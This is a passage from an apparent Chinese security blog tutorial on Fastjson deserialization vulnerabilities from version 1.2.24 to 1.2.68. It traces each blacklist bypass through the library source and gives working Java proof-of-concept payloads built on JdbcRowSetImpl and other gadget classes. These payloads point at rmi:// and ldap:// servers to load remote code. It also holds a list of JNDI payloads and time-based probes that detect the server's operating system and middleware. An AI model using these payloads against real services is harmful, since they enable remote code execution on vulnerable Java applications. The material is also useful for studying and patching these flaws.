class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/EXP\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130825.png" alt="image">​</p><p>‍</p><p>‍</p><h3 id="fastjson-1-2-25-1-2-41"><a href="#fastjson-1-2-25-1-2-41" class="headerlink" title="fastjson 1.2.25 - 1.2.41"></a>fastjson 1.2.25 - 1.2.41</h3><p>‍</p><h4 id="黑白名单的绕过"><a href="#黑白名单的绕过" class="headerlink" title="黑白名单的绕过"></a>黑白名单的绕过</h4><p>在fastjson自爆1.2.24版本的反序列化漏洞后，1.2.25版本就加入了黑白名单机制</p><p>执行了上述代码后 会提示你<code>autoType is not support</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130951.png" alt="image">​</p><p>我们可以查看 <code>com.alibaba.fastjson.parser.ParseConfig</code>​的源码可以看到加入了黑名单字眼</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130138.png" alt="image">​</p><p>具体为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml">bsh<br>com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload,org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss,org.mozilla.javascript<br>org.python.core<br>org.springframework<br></code></pre></td></tr></table></figure><p>我们去看一下<code>checkAutoType()</code>​方法</p><p>‍</p><p>如果是<code>autoTypeSupport</code>​ 开启了为true 就会去将@type的类去匹配白名单，如果匹配到了白名单就用<code>TypeUtils.loadClass</code>​ 去加载这个类</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130359.png" alt="image">​</p><p>然后如果不是白名单，就去匹配黑名单，匹配到了黑名单就会返回 <code>autoType is not support</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130491.png" alt="image">​</p><p>‍</p><p>如果没开<code>autoTypeSupport</code>​ 他就会先去匹配黑名单，是黑名单里头的就 <code>autoType is not support</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130652.png" alt="image">​</p><p>如果匹配不到黑名单，那么就匹配白名单，存在就加载，不存在就说匹配不到</p><p>最后如果要反序列化的类和黑白名单都未匹配时，只有开启了autoType或者expectClass不为空也就是指定了Class对象时才会调用TypeUtils.loadClass加载，否则fastjson会默认禁止加载该类 <span style="font-weight: bold;" data-type="strong">。</span></p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130777.png" alt="image">​</p><p>‍</p><p>我们跟进一下这里的<span style="font-weight: bold;" data-type="strong">loadClass</span>方法</p><p>然后这里有一个很奇怪的写法导致了问题的产生，</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130901.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130043.png" alt="image">​</p><ul><li>如果以<code>[</code>​开头则去掉<code>[</code>​后进行类加载（在之前Fastjson已经判断过是否为数组了，实际走不到这一步）</li><li>如果以<code>L</code>​开头，以<code>;</code>​结尾，则去掉开头和结尾进行类加载</li><li>‍</li></ul><p>所以在1.2.41之前就可以利用上述的处理机制来绕过黑白名单的限制</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130184.png" alt="image">​</p><p>Fastjson默认AutoTypeSupport为<code>False</code>​（默认开启白名单机制），需要通过服务端使用以下代码手动关闭，这一点是高版本一个难以绕过的地方。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().addAccept(<span class="hljs-string">&quot;org.example.,org.javaweb.&quot;</span>);<br>ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=org.example.<br>在fastjson.properties中添加：<br>fastjson.parser.autoTypeAccept=org.example.<br><br><span class="hljs-comment">//只有是true了 才可以在不匹配黑白名单的情况下走到loadClass里头</span><br></code></pre></td></tr></table></figure><p>那么其实也就很简单，只要以<code>L</code>​开头，以<code>;</code>​结尾就可以绕过了，这也就是&lt;&#x3D;1.2.41的绕过方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdbc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/nhdzhn\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130371.png" alt="image">​</p><p>‍</p><h3 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson&#x3D;1.2.42"></a>fastjson&#x3D;1.2.42</h3><p>1.2.42相较于之前的版本，关键是在<code>ParserConfig.java</code>​中修改了以下两点</p><ul><li>黑名单改为了hash值，防止绕过</li><li>对于传入的类名，删除开头<code>L</code>​和结尾的<code>;</code>​</li></ul><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130659.png" alt="image">​</p><p>发现黑名单全是hash了</p><p>但是可以仔细查看这个check的逻辑</p><p>其实这里进行了一个加密的混淆 虽然说利用hash可以让我们不知道禁用了什么类，但是加密方式是有写<code>com.alibaba.fastjson.parser.ParserConfig#addDeny</code>​中的<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>​，我们理论上可以遍历jar，字符串，类去碰撞得到这个hash的值。（因为常用的包是有限的）</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130840.png" alt="image">​</p><p>在上述的逻辑当中，看看GPT如何解释</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130041.png" alt="image">​</p><p>其实也可以看明白就是类似截取字符，把第一个字符跟倒数第一个字符进行截取(那么想到上一个版本的fastjson是<code>L</code>​跟<code>;</code>​，并且这个版本的黑名单是hash进行混淆了，并且也给出了加密的代码，所以说(牛子)很容易想到是先前的过滤，那么跟CTF一样，他过滤了一次，但是并没有过滤多次，所以双写绕过即可)</p><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdbc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/nhdzhn\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130165.png" alt="image">​</p><p>‍</p><h3 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson&#x3D;1.2.43"></a>fastjson&#x3D;1.2.43</h3><p>1.2.43版本修改了<code>checkAutoType()</code>​的部分代码，对于LL等开头结尾的字符串直接抛出异常。</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130448.png" alt="image">​</p><p>但他也没对<code>[</code>​进行限制啊？</p><p>我们可以通过<code>[&#123;</code>​绕过，Payload如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdbc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/nhdzhn\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130621.png" alt="image">​</p><p>原理的话首先<code>[</code>​是可以进入loadclass的逻辑的，但是Java处理的时候是存在json解析有问题的所以进行了报错</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130854.png" alt="image">​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Exception in thread <span class="hljs-string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: exepct <span class="hljs-string">&#x27;[&#x27;</span>, but ,, pos <span class="hljs-number">42</span>, json : &#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/nhdzhn&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p>那么看看GPT怎么说</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130041.png" alt="image">​</p><p>其实就是一个json字符串的解析，所以加上去就好了</p><p>加上后仍然报错，依旧是一一样的问题，所以加上<code>&#123;</code>​即可</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130161.png" alt="image">​</p><p>‍</p><h3 id="fastjson1-2-25-1-2-47通杀"><a href="#fastjson1-2-25-1-2-47通杀" class="headerlink" title="fastjson1.2.25-1.2.47通杀"></a>fastjson1.2.25-1.2.47通杀</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>1.2.25-1.2.32:</p><p>   未开启AutoTypeSupport时能成功利用</p><p>1.2.33-1.2.47:</p><p>   无论是否开启AutoTypeSupport都能成功利用</p><p>‍</p><p>并且传入的是java.lang.class在下面也能绕过黑名单，重点还是看第二个键值解析。</p><p>‍</p><h5 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.32"></a>1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.32</h5><p>先来继续查看这个<code>checkAutoType</code>​方法，因为没有开启AutoTypeSupport，所以就不会进入这个if黑白名单判断的逻辑，他就会有两种加载类的模式，如果说我们能够在这两种加载类的模式下把我们恶意类加载进去导致绕过了黑白名单，这是不是也是一种恶意类加载呢</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130402.png" alt="image">​</p><ol><li><code>TypeUtils.getClassFromMapping(typeName)</code>​ 这个mapping中找这个类</li></ol><p>步进这个Mapping，得到mapping如下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130543.png" alt="image">​</p><p>再步进一下mapping发现是一个private的实例化<code>ConcurrentHashMap</code>​对象</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130728.png" alt="image">​</p><p>那么由于知道这里是一个entry，所以就进行<code>mappings.put</code>​方法的搜索，发现在<span style="font-weight: bold;" data-type="strong">TypeUtils.loadClass</span> 有调用到</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130880.png" alt="image">​</p><p>再次全局搜索看哪里调用了 <code>TypeUtils.loadClass()</code>​</p><p>存在5处调用</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130070.png" alt="image">​</p><p>但其实这五处全是</p><ol><li>要开启<span style="font-weight: bold;" data-type="strong">autoType</span></li><li>类在白名单内</li><li>传不了参数</li></ol><p>最后在<code>com.alibaba.fastjson.serializer.MiscCodec.deserialze</code>​中分析</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130241.png" alt="image">​</p><p>发现是继承了 <code>ObjectSerializer</code>​  <code>ObjectDeserializer</code>​ 两个反序列化的父类</p><p>先看看调用的代码和传入的参数</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130413.png" alt="image">​</p><p>参数为 <code>strVal, parser.getConfig().getDefaultClassLoader()</code>​</p><p>先看看 <code>strVal</code>​ 是如何传入的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130602.png" alt="image">​</p><p>在这个266行当中可以看到代码为  <code>strVal = (String)objVal;</code>​</p><p>所以跟进一下<code>objVal</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130789.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130930.png" alt="image">​</p><p>然后整个链子也很清晰了，就是把我们在json中传入的val中的内容给到这个<code>strVal</code>​然后他会进行loadclass后载入mapping成为一个字符串的缓存，这样子就绕开了黑白名单限制了加载到缓存中以后，在下一次checkAutoType的时候，直接就返回了，绕过了检验的部分直接执行</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><ol start="2"><li><code>this.deserializers.findClass(typeName);</code>​ 去这里找这个类</li></ol><p>如果上面的无法加载类则进入这个逻辑，从 <code>deserializers.findClass(typeName)</code>​ 中获取类</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130097.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130258.png" alt="image">​</p><p>确实是可以写入数据的，但是去找一下谁调用了<code>putDeserializer</code>​ 但似乎是找不到可控的调用点，所以关注点就应该在上述方法中</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/evilObject\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>‍</p><h5 id="1-2-33"><a href="#1-2-33" class="headerlink" title="1.2.33&lt;&#x3D;Fastjson&lt;&#x3D;1.2.47"></a>1.2.33&lt;&#x3D;Fastjson&lt;&#x3D;1.2.47</h5><p>首先要思考一下为什么要分成两个部分？因为上面的版本开了<code>AutoTypeSupport</code>​ 是不成功的，而往后的版本是可以成功的，为什么呢？</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130400.png" alt="image">​</p><p>这一句话解释的非常清楚，就是说 在第一个键值载入缓存的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>这一串是不成立的，但是在1.2.25-1.2.32之间，他们开启的<code>AutoTypeSupport</code>​的时候，并没有这个语句，从而导致了不论你载入缓存没有，都会进入黑名单，所以都会被ban掉，而不知道为什么反而后面的版本加上了所以直接绕过了</p><p>‍</p><p>‍</p><h3 id="fastjson-1"><a href="#fastjson-1" class="headerlink" title="fastjson&lt;&#x3D;1.2.68"></a>fastjson&lt;&#x3D;1.2.68</h3><p><a href="https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ">https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ</a></p><p><a href="https://mp.weixin.qq.com/s/OvRyrWFZLGu3bAYhOPR4KA">https://mp.weixin.qq.com/s/OvRyrWFZLGu3bAYhOPR4KA</a></p><p>在这个版本当中官方修复了这个缓存的地方，</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130544.png" alt="image">​</p><p>但是他更新了一个 <code>safeMode</code>​ 如果开启了safeMode，那么autoType就会被完全禁止。不过在这个版本里默认是为false，后面的版本默认为true会直接抛出异常。 接着在下面的if中判断是否在期望类的黑名单中，而AutoCloseable不在黑名单中，所以给expectClassFlag赋值为true。</p><p>‍</p><p>来看一下这个<span style="font-weight: bold;" data-type="strong">checkAutoType函数</span></p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130727.png" alt="image">​</p><h3 id="fastjson-1-2-62"><a href="#fastjson-1-2-62" class="headerlink" title="fastjson&#x3D;1.2.62"></a>fastjson&#x3D;1.2.62</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;AsText&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>‍</p><h3 id="fastjson-1-2-66"><a href="#fastjson-1-2-66" class="headerlink" title="fastjson &#x3D; 1.2.66"></a>fastjson &#x3D; 1.2.66</h3><p>‍</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// 需要autotype true</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;resourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Properties&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;UserTransaction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h2 id="信息的探测"><a href="#信息的探测" class="headerlink" title="信息的探测"></a>信息的探测</h2><h3 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h3><p>去掉花括号不闭合的话，是会把版本号给露出来的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130864.png" alt="image">​</p><p>源码中可以看到 当解析器没读到}时，在报错中就会把版本号一起带出</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130070.png" alt="image">​</p><p>以下探测是存在fastjson并且可以加载字节码情况</p><h3 id="操作系统探测"><a href="#操作系统探测" class="headerlink" title="操作系统探测"></a>操作系统探测</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">osName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();<br>System.out.println(osName);<br><span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;nix&quot;</span>) || osName.contains(<span class="hljs-string">&quot;nux&quot;</span>) || osName.contains(<span class="hljs-string">&quot;mac&quot;</span>))<br>&#123;<br>    Thread.sleep(<span class="hljs-number">3000</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>    Thread.sleep(<span class="hljs-number">6000</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    Thread.sleep(<span class="hljs-number">9000</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><h3 id="中间件探测"><a href="#中间件探测" class="headerlink" title="中间件探测"></a>中间件探测</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">        Map&lt;Thread, StackTraceElement[]&gt; stackTraces = Thread.getAllStackTraces();<br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;Thread, StackTraceElement[]&gt; entry : stackTraces.entrySet()) &#123;<br>            StackTraceElement[] stackTraceElements = entry.getValue();<br>            <span class="hljs-keyword">for</span> (StackTraceElement element : stackTraceElements) &#123;<br><span class="hljs-comment">// element.getClassName().contains(&quot;org.springframework.web&quot;</span><br>                <span class="hljs-keyword">if</span> (element.getClassName().contains(<span class="hljs-string">&quot;org.apache.catalina.core&quot;</span>)) &#123;<br>                    Thread.sleep(<span class="hljs-number">5000</span>);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        